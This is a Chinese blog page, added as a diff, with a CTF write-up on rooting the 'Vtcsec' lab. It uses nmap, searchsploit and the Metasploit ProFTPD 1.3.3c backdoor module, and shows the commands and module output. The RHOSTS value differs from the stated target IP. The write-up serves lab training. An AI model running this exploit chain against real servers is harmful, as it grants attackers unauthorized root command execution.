@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="saulGoodman">
+
+
+
+
+
+<title>CTF-Vtcsec_WriteUp，ProFTPD软件后门未授权访问提权拿到Flag | 渗透攻击红队-专注于渗透红队攻击</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">saulGoodman</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">saulGoodman</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">CTF-Vtcsec_WriteUp，ProFTPD软件后门未授权访问提权拿到Flag</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">saulGoodman</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">December 27, 2019&nbsp;&nbsp;14:26:59</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/CTF/">CTF</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=499793274&auto=1&height=66"></iframe>
+
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/850.png" alt="图片"></p>
+<p>靶场名字：<code>Vtcsec</code><br>操作系统：<code>Linux</code><br>任务：拿到<code>/root/flag/</code><br>靶场IP：<code>10.10.10.126</code></p>
+<h2 id="学习到的知识"><a href="#学习到的知识" class="headerlink" title="学习到的知识"></a>学习到的知识</h2><p><code>ProFTPD</code>后门未经授权访问漏洞导致远程命令执行</p>
+<p><code>Metasploit</code>对<code>ProFTPD 1.3.3c</code>程序进行远程命令执行</p>
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>拿到 <code>IP</code> 后直接丢到<code>NMAP</code>一顿搜哈：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -T4 10.10.10.126</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/851.png" alt="图片"></p>
+<p>由上图得知，靶场开放了<code>21</code>（ftp）、<code>22</code>（ssh）、<code>80</code>（http）服务器，其中21所使用的ftp软件是<code>ProFTPD 1.3.3c</code>，<code>ProFTPD</code>是一个在<code>Linux</code>或者<code>Unix</code>下的<code>FTP</code>服务器程序！</p>
+<p>还是老规矩，先搜索软件有没有对应的漏洞（这是习惯）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit ProFTPD 1.3.3c</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/852.png" alt="图片"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">------------------------------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                                                                                     |  Path</span><br><span class="line">                                                                                                                   | (/usr/share/exploitdb/)</span><br><span class="line">------------------------------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">ProFTPd 1.3.3c - Compromised Source Backdoor Remote Code Execution                                                 | exploits/linux/remote/15662.txt</span><br><span class="line">ProFTPd-1.3.3c - Backdoor Command Execution (Metasploit)                                                           | exploits/linux/remote/16921.rb</span><br><span class="line">------------------------------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">Shellcodes: No Result</span><br></pre></td></tr></table></figure>
+
+<p>从搜索的结果得知有两个漏洞：第一个是<code>Compromised Source Backdoor Remote Code Execution</code>(后门远程代码执行)、第二个是<code>Backdoor Command Execution</code>(后门命令执行,基于<code>Metasploit</code>里).</p>
+<p>既然它存在<code>RCE</code>,那么直接用<code>Metasploit</code>来对它进行利用吧，打开<code>MSF</code>控制台：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
+
+<p>然后搜索一下有关<code>ProFTPd-1.3.3c</code>的<code>Payload</code>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search ProFTPd-1.3.3c</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/853.png" alt="图片"></p>
+<p>这个时候有一个漏洞利用模块：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/unix/ftp/proftpd_133c_backdoor </span><br></pre></td></tr></table></figure>
+
+<p>先看看有关它的信息：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info exploit/unix/ftp/proftpd_133c_backdoor </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/854.png" alt="图片"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; info exploit/unix/ftp/proftpd_133c_backdoor </span><br><span class="line"></span><br><span class="line">       Name: ProFTPD-1.3.3c Backdoor Command Execution</span><br><span class="line">     Module: exploit/unix/ftp/proftpd_133c_backdoor</span><br><span class="line">   Platform: Unix</span><br><span class="line">       Arch: cmd</span><br><span class="line"> Privileged: Yes</span><br><span class="line">    License: Metasploit Framework License (BSD)</span><br><span class="line">       Rank: Excellent</span><br><span class="line">  Disclosed: 2010-12-02</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">  MC &lt;mc@metasploit.com&gt;</span><br><span class="line">  darkharper2</span><br><span class="line"></span><br><span class="line">Available targets:</span><br><span class="line">  Id  Name</span><br><span class="line">  --  ----</span><br><span class="line">  0   Automatic</span><br><span class="line"></span><br><span class="line">Check supported:</span><br><span class="line">  No</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">  Name    Current Setting  Required  Description</span><br><span class="line">  ----    ---------------  --------  -----------</span><br><span class="line">  RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax <span class="string">&#x27;file:&lt;path&gt;&#x27;</span></span><br><span class="line">  RPORT   21               yes       The target port (TCP)</span><br><span class="line"></span><br><span class="line">Payload information:</span><br><span class="line">  Space: 2000</span><br><span class="line">  Avoid: 0 characters</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  This module exploits a malicious backdoor that was added to the </span><br><span class="line">  ProFTPD download archive. This backdoor was present <span class="keyword">in</span> the </span><br><span class="line">  proftpd-1.3.3c.tar.[bz2|gz] archive between November 28th 2010 and </span><br><span class="line">  2nd December 2010.</span><br><span class="line"></span><br><span class="line">References:</span><br><span class="line">  OSVDB (69562)</span><br><span class="line">  http://www.securityfocus.com/bid/45150</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，这个模块是<code>后门命令执行</code>的模块，它只需要设置对方的<code>IP</code>和<code>端口</code>就可以，受限的版本是<code>proftpd-1.3.3c</code>,下面是有关它的漏洞介绍：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/855.png" alt="图片"></p>
+<p><code>ProFTPD 1.3.3c</code>这个版本易于遭受<code>未经授权访问</code>漏洞。利用此漏洞，远程攻击者可以使用超级用户特权<code>执行任意系统命令</code>。</p>
+<p>那么就直接使用它吧：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use exploit/unix/ftp/proftpd_133c_backdoor</span><br><span class="line"><span class="built_in">set</span> RHOSTS 10.10.10.136</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/856.png" alt="图片"></p>
+<p>最后直接运行 <code>run</code> 得到一个 <code>sission</code>:</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/857.png" alt="图片"></p>
+<p>最终通过得到的<code>sission</code>拿到了<code>root</code>权限，在<code>/root</code>目录下拿到<code>flag</code>完成本次<code>CTF</code>!</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过使用<code>Metasploit</code>来对<code>ProFTPD</code>进行<code>远程命令执行</code>，最终成功提权拿到<code>FLAG</code>!</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>saulGoodman</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://example.com/2019/12/27/CTF-Vtcsec/">http://example.com/2019/12/27/CTF-Vtcsec/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"># 渗透测试</a>
+                    
+                        <a href="/tags/CTF/"># CTF</a>
+                    
+                        <a href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"># 权限提升</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2019/12/28/CTF-BTRsys1/">CTF-BTRsys1_WriteUp，通过Sql注入绕过登陆界面获取shell拿Root</a>
+            
+            
+            <a class="next" rel="next" href="/2019/12/26/CTF-Covfefe/">CTF-Covfefe_WriteUp，通过SSH私钥泄露再到程序溢出提权得到Flag</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© saulGoodman | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
